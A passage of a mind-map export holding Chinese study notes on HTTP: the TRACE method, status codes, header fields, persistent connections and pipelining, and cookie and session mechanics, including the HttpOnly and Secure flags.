</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: TRACE" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#trace">
</a>
    <blockquote>
      <p dir="auto">
        追踪路径
      </p>
    </blockquote>
    <p dir="auto">
      服务器会将通信路径返回给客户端。
    </p>
    <p dir="auto">
      发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。
    </p>
    <p dir="auto">
      通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪）。
    </p>
    <ul dir="auto">
      <li>
        <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html" rel="nofollow">rfc2616：9 Method Definitions</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1926724904" CREATED="1754750475174" MODIFIED="1754750475176"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、HTTP 状态码
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 三、HTTP 状态码" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#三http-状态码">
</a>
    <p dir="auto">
      服务器返回的 <strong>响应报文</strong>&#xa0;中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          状态码
        </th>
        <th>
          类别
        </th>
        <th>
          含义
        </th>
      </tr>
      <tr>
        <td>
          1XX
        </td>
        <td>
          Informational（信息性状态码）
        </td>
        <td>
          接收的请求正在处理
        </td>
      </tr>
      <tr>
        <td>
          2XX
        </td>
        <td>
          Success（成功状态码）
        </td>
        <td>
          请求正常处理完毕
        </td>
      </tr>
      <tr>
        <td>
          3XX
        </td>
        <td>
          Redirection（重定向状态码）
        </td>
        <td>
          需要进行附加操作以完成请求
        </td>
      </tr>
      <tr>
        <td>
          4XX
        </td>
        <td>
          Client Error（客户端错误状态码）
        </td>
        <td>
          服务器无法处理请求
        </td>
      </tr>
      <tr>
        <td>
          5XX
        </td>
        <td>
          Server Error（服务器错误状态码）
        </td>
        <td>
          服务器处理请求出错
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
<node ID="ID_1739165388" CREATED="1754750475176" MODIFIED="1754750475178"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1XX 信息
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1XX 信息" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#1xx-信息">
</a>
    <ul dir="auto">
      <li>
        <strong>100 Continue</strong>&#xa0;：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1019614778" CREATED="1754750475178" MODIFIED="1754750475180"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2XX 成功
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2XX 成功" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#2xx-成功">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          <strong>200 OK</strong>
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>204 No Content</strong>&#xa0;：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>206 Partial Content</strong>&#xa0;：表示客户端进行了范围请求，响应报文包含由 Content-Range 指定范围的实体内容。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_803656047" CREATED="1754750475180" MODIFIED="1754750475182"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3XX 重定向
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3XX 重定向" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#3xx-重定向">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          <strong>301 Moved Permanently</strong>&#xa0;：永久性重定向
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>302 Found</strong>&#xa0;：临时性重定向
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>303 See Other</strong>&#xa0;：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。
        </p>
      </li>
      <li>
        <p dir="auto">
          注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>304 Not Modified</strong>&#xa0;：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>307 Temporary Redirect</strong>&#xa0;：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_103705207" CREATED="1754750475182" MODIFIED="1754750475184"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4XX 客户端错误
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4XX 客户端错误" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#4xx-客户端错误">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          <strong>400 Bad Request</strong>&#xa0;：请求报文中存在语法错误。
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>401 Unauthorized</strong>&#xa0;：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>403 Forbidden</strong>&#xa0;：请求被拒绝。
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>404 Not Found</strong>
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1197048288" CREATED="1754750475184" MODIFIED="1754750475186"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5XX 服务器错误
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5XX 服务器错误" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#5xx-服务器错误">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          <strong>500 Internal Server Error</strong>&#xa0;：服务器正在执行请求时发生错误。
        </p>
      </li>
      <li>
        <p dir="auto">
          <strong>503 Service Unavailable</strong>&#xa0;：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1484654508" CREATED="1754750475186" MODIFIED="1754750475188"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、HTTP 首部
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 四、HTTP 首部" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#四http-首部">
</a>
    <p dir="auto">
      有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。
    </p>
    <p dir="auto">
      各种首部字段及其含义如下（不需要全记，仅供查阅）：
    </p>
  </body>
</html></richcontent>
<node ID="ID_1765438055" CREATED="1754750475188" MODIFIED="1754750475190"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      通用首部字段
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 通用首部字段" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#通用首部字段">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          首部字段名
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          Cache-Control
        </td>
        <td>
          控制缓存的行为
        </td>
      </tr>
      <tr>
        <td>
          Connection
        </td>
        <td>
          控制不再转发给代理的首部字段、管理持久连接
        </td>
      </tr>
      <tr>
        <td>
          Date
        </td>
        <td>
          创建报文的日期时间
        </td>
      </tr>
      <tr>
        <td>
          Pragma
        </td>
        <td>
          报文指令
        </td>
      </tr>
      <tr>
        <td>
          Trailer
        </td>
        <td>
          报文末端的首部一览
        </td>
      </tr>
      <tr>
        <td>
          Transfer-Encoding
        </td>
        <td>
          指定报文主体的传输编码方式
        </td>
      </tr>
      <tr>
        <td>
          Upgrade
        </td>
        <td>
          升级为其他协议
        </td>
      </tr>
      <tr>
        <td>
          Via
        </td>
        <td>
          代理服务器的相关信息
        </td>
      </tr>
      <tr>
        <td>
          Warning
        </td>
        <td>
          错误通知
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
<node ID="ID_1377426891" CREATED="1754750475191" MODIFIED="1754750475193"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      请求首部字段
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 请求首部字段" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#请求首部字段">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          首部字段名
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          Accept
        </td>
        <td>
          用户代理可处理的媒体类型
        </td>
      </tr>
      <tr>
        <td>
          Accept-Charset
        </td>
        <td>
          优先的字符集
        </td>
      </tr>
      <tr>
        <td>
          Accept-Encoding
        </td>
        <td>
          优先的内容编码
        </td>
      </tr>
      <tr>
        <td>
          Accept-Language
        </td>
        <td>
          优先的语言（自然语言）
        </td>
      </tr>
      <tr>
        <td>
          Authorization
        </td>
        <td>
          Web 认证信息
        </td>
      </tr>
      <tr>
        <td>
          Expect
        </td>
        <td>
          期待服务器的特定行为
        </td>
      </tr>
      <tr>
        <td>
          From
        </td>
        <td>
          用户的电子邮箱地址
        </td>
      </tr>
      <tr>
        <td>
          Host
        </td>
        <td>
          请求资源所在服务器
        </td>
      </tr>
      <tr>
        <td>
          If-Match
        </td>
        <td>
          比较实体标记（ETag）
        </td>
      </tr>
      <tr>
        <td>
          If-Modified-Since
        </td>
        <td>
          比较资源的更新时间
        </td>
      </tr>
      <tr>
        <td>
          If-None-Match
        </td>
        <td>
          比较实体标记（与 If-Match 相反）
        </td>
      </tr>
      <tr>
        <td>
          If-Range
        </td>
        <td>
          资源未更新时发送实体 Byte 的范围请求
        </td>
      </tr>
      <tr>
        <td>
          If-Unmodified-Since
        </td>
        <td>
          比较资源的更新时间（与 If-Modified-Since 相反）
        </td>
      </tr>
      <tr>
        <td>
          Max-Forwards
        </td>
        <td>
          最大传输逐跳数
        </td>
      </tr>
      <tr>
        <td>
          Proxy-Authorization
        </td>
        <td>
          代理服务器要求客户端的认证信息
        </td>
      </tr>
      <tr>
        <td>
          Range
        </td>
        <td>
          实体的字节范围请求
        </td>
      </tr>
      <tr>
        <td>
          Referer
        </td>
        <td>
          对请求中 URI 的原始获取方
        </td>
      </tr>
      <tr>
        <td>
          TE
        </td>
        <td>
          传输编码的优先级
        </td>
      </tr>
      <tr>
        <td>
          User-Agent
        </td>
        <td>
          HTTP 客户端程序的信息
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
<node ID="ID_458709975" CREATED="1754750475194" MODIFIED="1754750475197"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      响应首部字段
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 响应首部字段" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#响应首部字段">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          首部字段名
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          Accept-Ranges
        </td>
        <td>
          是否接受字节范围请求
        </td>
      </tr>
      <tr>
        <td>
          Age
        </td>
        <td>
          推算资源创建经过时间
        </td>
      </tr>
      <tr>
        <td>
          ETag
        </td>
        <td>
          资源的匹配信息
        </td>
      </tr>
      <tr>
        <td>
          Location
        </td>
        <td>
          令客户端重定向至指定 URI
        </td>
      </tr>
      <tr>
        <td>
          Proxy-Authenticate
        </td>
        <td>
          代理服务器对客户端的认证信息
        </td>
      </tr>
      <tr>
        <td>
          Retry-After
        </td>
        <td>
          对再次发起请求的时机要求
        </td>
      </tr>
      <tr>
        <td>
          Server
        </td>
        <td>
          HTTP 服务器的安装信息
        </td>
      </tr>
      <tr>
        <td>
          Vary
        </td>
        <td>
          代理服务器缓存的管理信息
        </td>
      </tr>
      <tr>
        <td>
          WWW-Authenticate
        </td>
        <td>
          服务器对客户端的认证信息
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
<node ID="ID_503425739" CREATED="1754750475197" MODIFIED="1754750475199"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      实体首部字段
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 实体首部字段" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#实体首部字段">
</a><markdown-accessiblity-table data-catalyst=""/>
    <table>
      <tr>
        <th>
          首部字段名
        </th>
        <th>
          说明
        </th>
      </tr>
      <tr>
        <td>
          Allow
        </td>
        <td>
          资源可支持的 HTTP 方法
        </td>
      </tr>
      <tr>
        <td>
          Content-Encoding
        </td>
        <td>
          实体主体适用的编码方式
        </td>
      </tr>
      <tr>
        <td>
          Content-Language
        </td>
        <td>
          实体主体的自然语言
        </td>
      </tr>
      <tr>
        <td>
          Content-Length
        </td>
        <td>
          实体主体的大小
        </td>
      </tr>
      <tr>
        <td>
          Content-Location
        </td>
        <td>
          替代对应资源的 URI
        </td>
      </tr>
      <tr>
        <td>
          Content-MD5
        </td>
        <td>
          实体主体的报文摘要
        </td>
      </tr>
      <tr>
        <td>
          Content-Range
        </td>
        <td>
          实体主体的位置范围
        </td>
      </tr>
      <tr>
        <td>
          Content-Type
        </td>
        <td>
          实体主体的媒体类型
        </td>
      </tr>
      <tr>
        <td>
          Expires
        </td>
        <td>
          实体主体过期的日期时间
        </td>
      </tr>
      <tr>
        <td>
          Last-Modified
        </td>
        <td>
          资源的最后修改日期时间
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1988774730" CREATED="1754750475209" MODIFIED="1754750475209"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、具体应用
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1713265047" CREATED="1754750475212" MODIFIED="1754750475213"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      连接管理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 连接管理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#连接管理">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b6e7bd0d51caa097c97cfa9795e73c3484bc0ef5e5f59a5445c612856a443099/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f48545450315f785f436f6e6e656374696f6e732e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/b6e7bd0d51caa097c97cfa9795e73c3484bc0ef5e5f59a5445c612856a443099/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f48545450315f785f436f6e6e656374696f6e732e706e67" width="800" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/HTTP1_x_Connections.png"/></a><br/>  </body>
</html></richcontent>
<node ID="ID_1702824051" CREATED="1754750475214" MODIFIED="1754750475215"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 短连接与长连接
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 短连接与长连接" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#1-短连接与长连接">
</a>
    <p dir="auto">
      当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问的 HTML 页面资源，还会请求图片资源。如果每进行一次 HTTP 通信就要新建一个 TCP 连接，那么开销会很大。
    </p>
    <p dir="auto">
      长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。
    </p>
    <ul dir="auto">
      <li>
        从 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 <code>Connection : close</code>；
      </li>
      <li>
        在 HTTP/1.1 之前默认是短连接的，如果需要使用长连接，则使用 <code>Connection : Keep-Alive</code>。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_269248787" CREATED="1754750475216" MODIFIED="1754750475217"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 流水线
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 流水线" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#2-流水线">
</a>
    <p dir="auto">
      默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到响应之后才会被发出。由于受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。
    </p>
    <p dir="auto">
      流水线是在同一条长连接上连续发出请求，而不用等待响应返回，这样可以减少延迟。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_382199018" CREATED="1754750475218" MODIFIED="1754750475219"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Cookie
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Cookie" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#cookie">
</a>
    <p dir="auto">
      HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。
    </p>
    <p dir="auto">
      Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发起请求时被携带上，用于告知服务端两个请求是否来自同一浏览器。由于之后每次请求都会需要携带 Cookie 数据，因此会带来额外的性能开销（尤其是在移动环境下）。
    </p>
    <p dir="auto">
      Cookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API（本地存储和会话存储）或 IndexedDB。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1970095607" CREATED="1754750475220" MODIFIED="1754750475221"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 用途
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 用途" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#1-用途">
</a>
    <ul dir="auto">
      <li>
        会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
      </li>
      <li>
        个性化设置（如用户自定义设置、主题等）
      </li>
      <li>
        浏览器行为跟踪（如跟踪分析用户行为等）
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1002146394" CREATED="1754750475222" MODIFIED="1754750475223"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 创建过程
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 创建过程" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#2-创建过程">
</a>
    <p dir="auto">
      服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。
    </p>
    <pre>HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
[page content]</pre>
    <p dir="auto">
      客户端之后对同一个服务器发送请求时，会从浏览器中取出 Cookie 信息并通过 Cookie 请求首部字段发送给服务器。
    </p>
    <pre>GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_993669146" CREATED="1754750475224" MODIFIED="1754750475226"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 分类
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 分类" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#3-分类">
</a>
    <ul dir="auto">
      <li>
        会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。
      </li>
      <li>
        持久性 Cookie：指定过期时间（Expires）或有效期（max-age）之后就成为了持久性的 Cookie。
      </li>
    </ul>
    <pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1723685493" CREATED="1754750475226" MODIFIED="1754750475228"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 作用域
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 作用域" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#4-作用域">
</a>
    <p dir="auto">
      Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。
    </p>
    <p dir="auto">
      Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (&quot;/&quot;) 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配：
    </p>
    <ul dir="auto">
      <li>
        /docs
      </li>
      <li>
        /docs/Web/
      </li>
      <li>
        /docs/Web/HTTP
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1982988837" CREATED="1754750475228" MODIFIED="1754750475230"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. JavaScript
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. JavaScript" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#5-javascript">
</a>
    <p dir="auto">
      浏览器通过 <code>document.cookie</code>&#xa0;属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。
    </p>
    <pre>document.cookie = &quot;yummy_cookie=choco&quot;;
document.cookie = &quot;tasty_cookie=strawberry&quot;;
console.log(document.cookie);</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1827291975" CREATED="1754750475230" MODIFIED="1754750475232"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. HttpOnly
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 6. HttpOnly" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#6-httponly">
</a>
    <p dir="auto">
      标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用。跨站脚本攻击 (XSS) 常常使用 JavaScript 的 <code>document.cookie</code>&#xa0;API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。
    </p>
    <pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_830139488" CREATED="1754750475232" MODIFIED="1754750475233"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. Secure
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 7. Secure" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#7-secure">
</a>
    <p dir="auto">
      标记为 Secure 的 Cookie 只能通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_285009161" CREATED="1754750475234" MODIFIED="1754750475235"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. Session
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 8. Session" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#8-session">
</a>
    <p dir="auto">
      除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。
    </p>
    <p dir="auto">
      Session 可以存储在服务器上的文件、数据库或者内存中。也可以将 Session 存储在 Redis 这种内存型数据库中，效率会更高。
    </p>
    <p dir="auto">
      使用 Session 维护用户登录状态的过程如下：
    </p>
    <ul dir="auto">
      <li>
        用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中；
      </li>
      <li>
        服务器验证该用户名和密码，如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 Key 称为 Session ID；
      </li>
      <li>
        服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中；
      </li>
      <li>
        客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之前的业务操作。
      </li>
    </ul>
    <p dir="auto">
      应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_465720964" CREATED="1754750475236" MODIFIED="1754750475237"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      9. 浏览器禁用 Cookie
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 9. 浏览器禁用 Cookie" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#9-浏览器禁用-cookie">
</a>
    <p dir="auto">
      此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1426166477" CREATED="1754750475238" MODIFIED="1754750475239"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      10. Cookie 与 Session 选择
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 10. Cookie 与 Session 选择" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#10-cookie-与-session-选择">
</a>
    <ul dir="auto">
      <li>
        Cookie 只能存储 ASCII 码字符串，而 Session 则可以存储任何类型的数据，因此在考虑数据复杂性时首选 Session；
      </li>
      <li>
        Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密；
      </li>
      <li>
        对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1120957040" CREATED="1754750475240" MODIFIED="1754750475240"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      缓存
    </p>
  </body>
</html>
</richcontent>
